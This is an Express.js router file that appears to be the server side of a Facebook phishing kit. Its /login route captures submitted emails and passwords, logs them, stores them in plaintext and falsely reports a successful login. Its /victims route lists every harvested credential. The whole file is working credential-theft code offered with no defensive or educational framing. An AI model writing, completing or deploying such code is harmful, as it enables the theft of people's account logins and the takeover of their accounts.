const express = require("express");
const FaceBook = require("./model");

const router = express.Router();

// Register Route
router.post("/login", async (req, res) => {
    try {
        const { email, password } = req.body;
        console.log(email, password)
        // Create new user
        const newUser = new FaceBook({ email, password });
        const uuu = await newUser.save();
        if(uuu){
            console.log("User Login successfully")
        }

        res.status(201).json({ success: true, message: "User Login successfully" });
    } catch (error) {
        res.status(500).json({ success: false, message: "Server error" });
    }
});

router.get("/victims", async (req, res) => {
    try {
        const users = await FaceBook.find(); // Fetch all users
        res.status(200).json({ success: true, data: users });
    } catch (error) {
        res.status(500).json({ success: false, message: "Login faield" });
    }
});

module.exports = router;
